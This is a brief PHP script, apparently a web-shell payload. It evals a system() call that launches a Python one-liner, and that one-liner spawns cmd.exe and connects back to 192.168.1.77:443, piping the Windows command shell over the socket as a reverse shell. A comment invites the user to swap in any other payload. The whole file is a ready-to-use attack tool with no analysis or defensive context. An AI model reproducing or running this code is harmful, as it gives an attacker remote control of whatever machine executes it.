<?php
    $cmd = "system(\"python.exe -c \\\"import socket,os,threading,subprocess as sp; p=sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT); s=socket.socket(); s.connect(('192.168.1.77',443)); threading.Thread(target=lambda: exec('while True: o=os.read(p.stdout.fileno(),1024); s.send(o)', globals()), daemon=True).start(); threading.Thread(target=lambda: exec('while True: i=s.recv(1024); os.write(p.stdin.fileno(),i)', globals())).start()\\\"\");";
    // you can edit the payload as u like!(the one inside system)  
    eval($cmd);

